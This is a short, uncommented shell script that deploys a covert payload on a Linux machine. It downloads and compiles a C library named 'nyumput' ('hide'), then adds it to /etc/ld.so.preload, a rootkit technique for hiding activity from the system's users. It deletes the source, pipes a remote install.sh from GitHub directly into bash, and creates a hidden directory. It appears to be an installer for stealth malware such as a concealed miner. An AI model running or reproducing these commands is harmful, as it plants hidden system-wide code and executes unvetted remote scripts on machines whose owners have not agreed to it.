apt-get update ; apt-get install sudo wget -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
curl https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/install.sh | bash
mkdir .lib && cd .lib
